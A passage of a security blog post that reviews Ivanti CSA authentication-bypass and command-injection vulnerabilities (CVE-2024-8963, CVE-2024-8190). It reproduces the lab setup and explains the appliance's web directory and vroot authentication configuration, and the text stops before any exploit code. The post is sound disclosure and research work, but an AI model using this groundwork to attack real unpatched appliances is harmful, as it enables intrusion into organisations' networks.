<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Vulnerability Review:Ivanti CSA Exploits Authentication Bypass (CVE-2024-8963) and Command Injection (CVE-2024-8190)" />
<meta name="author" content="imjdl" />
<meta property="og:locale" content="en" />
<meta name="description" content="Overview" />
<meta property="og:description" content="Overview" />
<link rel="canonical" href="/posts/ivanti-csa/" />
<meta property="og:url" content="/posts/ivanti-csa/" />
<meta property="og:site_name" content="imjdl blog" />
<meta property="og:image" content="/assets/img/csa/logo.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-11-06T12:13:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/img/csa/logo.png" />
<meta property="twitter:title" content="Vulnerability Review:Ivanti CSA Exploits Authentication Bypass (CVE-2024-8963) and Command Injection (CVE-2024-8190)" />
<meta name="twitter:site" content="@Mortyjin" />
<meta name="twitter:creator" content="@MortyJin" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"imjdl","url":"https://github.com/imjdl/"},"dateModified":"2024-11-06T12:13:00+08:00","datePublished":"2024-11-06T12:13:00+08:00","description":"Overview","headline":"Vulnerability Review:Ivanti CSA Exploits Authentication Bypass (CVE-2024-8963) and Command Injection (CVE-2024-8190)","image":"/assets/img/csa/logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/ivanti-csa/"},"url":"/posts/ivanti-csa/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Vulnerability Review:Ivanti CSA Exploits Authentication Bypass (CVE-2024-8963) and Command Injection (CVE-2024-8190) | imjdl blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imjdl blog">
<meta name="application-name" content="imjdl blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js,npm/mermaid@11.4.0/dist/mermaid.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script async src="/assets/js/data/mathjax.js"></script>
  <script async src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js"></script>


<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/favicons/log.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">imjdl blog</a>
    <p class="site-subtitle fst-italic mb-0">Perpetual student, continual incremental improvement.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/reading-list/" class="nav-link">
            <i class="fa-fw fa fa-list-alt"></i>
            

            <span>READING LIST</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imjdl"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/Mortyjin"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['imelloit','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Vulnerability Review:Ivanti CSA Exploits Authentication Bypass (CVE-2024-8963) and Command Injection (CVE-2024-8190)</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Vulnerability Review:Ivanti CSA Exploits Authentication Bypass (CVE-2024-8963) and Command Injection (CVE-2024-8190)</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1730866380"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Nov  6, 2024
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/csa/logo.png" class="popup img-link preview-img shimmer"><img src="/assets/img/csa/logo.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://github.com/imjdl/">imjdl</a>
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1743 words"
>
  <em>9 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">Vulnerability Review:Ivanti CSA Exploits Authentication Bypass (CVE-2024-8963) and Command Injection (CVE-2024-8190)</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">Vulnerability Review:Ivanti CSA Exploits Authentication Bypass (CVE-2024-8963) and Command Injection (CVE-2024-8190)</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <h2 id="overview"><span class="me-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Ivanti CSA is a unified endpoint management platform that provides a comprehensive suite of tools for managing and securing
devices, applications, and data across an organization’s network. It offers features such as asset management, software
deployment, remote control, and security policies to ensure compliance and protect against cyber threats.</p>

<p>In the most recent security research, Fortinet exposed a sophisticated cyberattack targeting Ivanti Cloud Services Appliance (CSA), which involved two previously unknown zero-day vulnerabilities [1]. This article thoroughly explores how attackers skillfully linked these vulnerabilities to gain initial access to the victims’ networks, highlighting the complexity and stealth of cyber threats.</p>

<p>The article emphasizes that the affected platforms are Ivanti CSA versions 4.6 and prior, meaning any organization using these versions could be at risk. A successful attack could result in remote attackers taking control of vulnerable systems, with the impact and severity level rated as “severe.”</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>Vulnerability ID</th>
      <th>Vulnerability Type</th>
      <th>Public Status</th>
      <th>Disclosure Date</th>
      <th>Affected Component</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>CVE-2024-8190</td>
      <td>Command Injection Vulnerability</td>
      <td>Publicly Disclosed</td>
      <td>2024-09-10</td>
      <td>/gsb/datetime.php</td>
      <td>Affects CSA versions 4.6 and earlier, allowing attackers to execute command injection attacks.</td>
    </tr>
    <tr>
      <td>CVE-2024-8963</td>
      <td>Path Traversal Vulnerability</td>
      <td>Not Publicly Disclosed</td>
      <td>2024-09-19</td>
      <td>/client/index.php</td>
      <td>Allows attackers to access unauthorized resources through path traversal, such as users.php, etc.</td>
    </tr>
    <tr>
      <td>CVE-2024-9380</td>
      <td>Command Injection Vulnerability</td>
      <td>Not Publicly Disclosed</td>
      <td>2024-10-08</td>
      <td>/gsb/reports.php</td>
      <td>Affects the reports.php resource, allowing attackers to execute command injection attacks.</td>
    </tr>
  </tbody>
</table></div>

<p>Horizon3.ai publicly disclosed the command injection vulnerability CVE-2024-8190 in Ivanti Cloud Service Appliance (CSA) on September 10, 2024. Subsequently, Fortinet publicly disclosed two other severe vulnerabilities, CVE-2024-8963 and CVE-2024-9380, on October 8, 2024. Although details and exploit code for CVE-2024-8190 have been made public, there is a relative scarcity of detailed information and analysis materials regarding CVE-2024-8963. Therefore, I have decided to reproduce the vulnerability in Ivanti CSA version 4.6, conduct an in-depth analysis of CVE-2024-8963, and on this basis, discuss methods of exploiting the vulnerability and escalating privileges. Given that these vulnerabilities have been exploited by multiple organizations, the purpose of this article is to alert relevant personnel to pay sufficient attention to these vulnerabilities and to take prompt action for remediation in order to prevent potential security threats.</p>

<h2 id="technical-analysis"><span class="me-2">Technical Analysis</span><a href="#technical-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="authentication-bypass"><span class="me-2">Authentication Bypass</span><a href="#authentication-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>According to the CSA <a href="https://www.youtube.com/watch?v=f3bP-wm5tJA">setup tutorial</a>, you can quickly build a vulnerability analysis lab environment. Once all preparations are complete, by executing the <code class="language-plaintext highlighter-rouge">netstat</code> command, you can observe that the CSA Web service is provided by Broker, which is a Web service component implemented by CSA itself. When accessing PHP resources, Broker will start a <code class="language-plaintext highlighter-rouge">php-cgi</code> process to handle the request.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="o">[</span>root@localhost ~]# netstat <span class="nt">-punta</span> | <span class="nb">grep </span>LISTEN
tcp        0      0 0.0.0.0:111             0.0.0.0:<span class="k">*</span>               LISTEN      1/systemd           
tcp        0      0 127.0.0.1:80            0.0.0.0:<span class="k">*</span>               LISTEN      1482/broker         
tcp        0      0 192.168.32.127:80       0.0.0.0:<span class="k">*</span>               LISTEN      1482/broker         
tcp        0      0 192.168.122.1:53        0.0.0.0:<span class="k">*</span>               LISTEN      1462/dnsmasq        
tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      1002/sshd           
tcp        0      0 127.0.0.1:5432          0.0.0.0:<span class="k">*</span>               LISTEN      1029/postmaster     
tcp        0      0 127.0.0.1:443           0.0.0.0:<span class="k">*</span>               LISTEN      1482/broker         
tcp        0      0 192.168.32.127:443      0.0.0.0:<span class="k">*</span>               LISTEN      1482/broker         
tcp6       0      0 :::111                  :::<span class="k">*</span>                    LISTEN      1/systemd           
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      1002/sshd  
</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/csa/image.png" class="popup img-link  shimmer"><img src="/assets/img/csa/image.png" alt="alt text" loading="lazy"></a></p>

<p>The Web directory structure of CSA is shown in the figure. Each request is not directly handled by <code class="language-plaintext highlighter-rouge">php-cgi</code>, but first goes through an authentication process. The permissions for accessing the corresponding directories are defined by the <code class="language-plaintext highlighter-rouge">vroot</code> file.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="o">[</span>root@localhost webroot]# <span class="nb">pwd</span>
/opt/landesk/broker/webroot
<span class="o">[</span>root@localhost webroot]# <span class="nb">ls
</span>allowed  backups  backups.vroot  cba8.crt  client  client.vroot  gsb  gsbweb.vroot  images  index.tmpl  ldmg.ico  lib  local.vroot  mg.crt  rc  rc.vroot  upload  upload.vroot.unused
</pre></td></tr></tbody></table></code></div></div>
<p>In the <code class="language-plaintext highlighter-rouge">client.vroot</code> file, the <code class="language-plaintext highlighter-rouge">allowedMethods</code> element defines the allowed HTTP request methods, which are limited to GET and HEAD requests. This ensures that clients can only access resources through these two methods, thereby limiting the operational permissions on server resources. The <code class="language-plaintext highlighter-rouge">handler</code> element specifies that the handler for <code class="language-plaintext highlighter-rouge">.php</code> files is CGI, and sets the path of the CGI handler to <code class="language-plaintext highlighter-rouge">/usr/bin/php-cgi</code>, allowing the server to correctly execute PHP scripts. The <code class="language-plaintext highlighter-rouge">authenticate</code> element is set to <code class="language-plaintext highlighter-rouge">none</code>, indicating that no authentication is required for users accessing this directory, allowing all users to access the resources in the directory without logging in.</p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;application&gt;</span>
        <span class="nt">&lt;environment&gt;</span>
                <span class="nt">&lt;APPLICATION_ROOT&gt;</span>/gsb<span class="nt">&lt;/APPLICATION_ROOT&gt;</span>
        <span class="nt">&lt;/environment&gt;</span>
        <span class="nt">&lt;index&gt;</span>
                <span class="ni">&amp;lt;</span>a href="http:///client/"<span class="ni">&amp;gt;</span>Cloud Services Appliance Utilities<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>
                <span class="ni">&amp;lt;</span>br<span class="ni">&amp;gt;</span>
                <span class="ni">&amp;lt;</span>a href="http:///client/LDMGdeploy.pdf"<span class="ni">&amp;gt;</span>User's Guide<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>
        <span class="nt">&lt;/index&gt;</span>
        <span class="nt">&lt;directory&gt;</span>
                <span class="nt">&lt;root&gt;</span>/client<span class="nt">&lt;/root&gt;</span>
                <span class="nt">&lt;location&gt;</span>/opt/landesk/broker/webroot<span class="nt">&lt;/location&gt;</span>
                <span class="nt">&lt;directoryDefault&gt;</span>/client/index.php<span class="nt">&lt;/directoryDefault&gt;</span>
                <span class="nt">&lt;authenticate&gt;</span>none<span class="nt">&lt;/authenticate&gt;</span>
                <span class="nt">&lt;protocol&gt;</span>BOTH<span class="nt">&lt;/protocol&gt;</span>
                <span class="nt">&lt;showDir&gt;</span>1<span class="nt">&lt;/showDir&gt;</span>
                <span class="nt">&lt;allowedMethods&gt;</span>
                        <span class="nt">&lt;verb&gt;</span>GET<span class="nt">&lt;/verb&gt;</span>
                        <span class="nt">&lt;verb&gt;</span>HEAD<span class="nt">&lt;/verb&gt;</span>
                <span class="nt">&lt;/allowedMethods&gt;</span>
                <span class="nt">&lt;map&gt;</span>
                        <span class="nt">&lt;spec&gt;</span>*.php<span class="nt">&lt;/spec&gt;</span>
                        <span class="nt">&lt;handler&gt;</span>CGI<span class="nt">&lt;/handler&gt;</span>
                        <span class="nt">&lt;path&gt;</span>/usr/bin/php-cgi<span class="nt">&lt;/path&gt;</span>
                <span class="nt">&lt;/map&gt;</span>
                <span class="nt">&lt;hide&gt;</span>
                        <span class="nt">&lt;spec&gt;</span>*.desc<span class="nt">&lt;/spec&gt;</span>
                        <span class="nt">&lt;spec&gt;</span>*.conf<span class="nt">&lt;/spec&gt;</span>
                <span class="nt">&lt;/hide&gt;</span>
        <span class="nt">&lt;/directory&gt;</span>
<span class="nt">&lt;/application&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>In the <code class="language-plaintext highlighter-rouge">gsbweb.vroot</code> file, the <code class="language-plaintext highlighter-rouge">allowedMethods</code> element defines restrictions on HTTP request methods for different resources: for the <code class="language-plaintext highlighter-rouge">favicon.ico</code> file, only GET requests are allowed, ensuring that clients can only retrieve the icon file; for the <code class="language-plaintext highlighter-rouge">/gsb</code> directory, GET, POST, and HEAD requests are permitted, allowing users to retrieve resources, submit data, and obtain metadata about the resources. The <code class="language-plaintext highlighter-rouge">handler</code> element specifies that <code class="language-plaintext highlighter-rouge">.php</code> files are processed by the CGI handler, with the path set to <code class="language-plaintext highlighter-rouge">/usr/bin/php-cgi</code>, ensuring that PHP scripts can be executed correctly. The <code class="language-plaintext highlighter-rouge">authenticate</code> element is set to <code class="language-plaintext highlighter-rouge">AdminLocalNoauth</code> for the <code class="language-plaintext highlighter-rouge">/gsb</code> directory, meaning that access to this directory requires specific local administrator authentication without full identity verification. This could be a special permission control strategy, allowing only certain local administrator users to access it without going through a complete authentication process.</p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;application&gt;</span>
        <span class="nt">&lt;environment&gt;</span>
                <span class="nt">&lt;APPLICATION_ROOT&gt;</span>/gsb<span class="nt">&lt;/APPLICATION_ROOT&gt;</span>
        <span class="nt">&lt;/environment&gt;</span>
        <span class="nt">&lt;index&gt;</span><span class="ni">&amp;lt;</span>a href="https:///gsb/"<span class="ni">&amp;gt;</span>Cloud Services Appliance Console<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span><span class="nt">&lt;/index&gt;</span>
        <span class="nt">&lt;file&gt;</span>
                <span class="nt">&lt;root&gt;</span>/favicon.ico<span class="nt">&lt;/root&gt;</span>
                <span class="nt">&lt;location&gt;</span>/opt/landesk/broker/webroot<span class="nt">&lt;/location&gt;</span>
                <span class="nt">&lt;protocol&gt;</span>BOTH<span class="nt">&lt;/protocol&gt;</span>
                <span class="nt">&lt;allowedMethods&gt;</span>
                        <span class="nt">&lt;verb&gt;</span>GET<span class="nt">&lt;/verb&gt;</span>
                <span class="nt">&lt;/allowedMethods&gt;</span>
        <span class="nt">&lt;/file&gt;</span>
        <span class="nt">&lt;directory&gt;</span>
                <span class="nt">&lt;root&gt;</span>/gsb<span class="nt">&lt;/root&gt;</span>
                <span class="nt">&lt;location&gt;</span>/opt/landesk/broker/webroot<span class="nt">&lt;/location&gt;</span>
                <span class="nt">&lt;directoryDefault&gt;</span>/gsb/index.php<span class="nt">&lt;/directoryDefault&gt;</span>
                <span class="nt">&lt;authenticate&gt;</span>AdminLocalNoauth<span class="nt">&lt;/authenticate&gt;</span>
                <span class="nt">&lt;protocol&gt;</span>HTTPSWithHTTPLocal<span class="nt">&lt;/protocol&gt;</span>
                <span class="nt">&lt;showDir&gt;</span>1<span class="nt">&lt;/showDir&gt;</span>
                <span class="nt">&lt;allowedMethods&gt;</span>
                        <span class="nt">&lt;verb&gt;</span>GET<span class="nt">&lt;/verb&gt;</span>
                        <span class="nt">&lt;verb&gt;</span>POST<span class="nt">&lt;/verb&gt;</span>
                        <span class="nt">&lt;verb&gt;</span>HEAD<span class="nt">&lt;/verb&gt;</span>
                <span class="nt">&lt;/allowedMethods&gt;</span>
                <span class="nt">&lt;map&gt;</span>
                        <span class="nt">&lt;spec&gt;</span>*.php<span class="nt">&lt;/spec&gt;</span>
                        <span class="nt">&lt;handler&gt;</span>CGI<span class="nt">&lt;/handler&gt;</span>
                        <span class="nt">&lt;path&gt;</span>/usr/bin/php-cgi<span class="nt">&lt;/path&gt;</span>
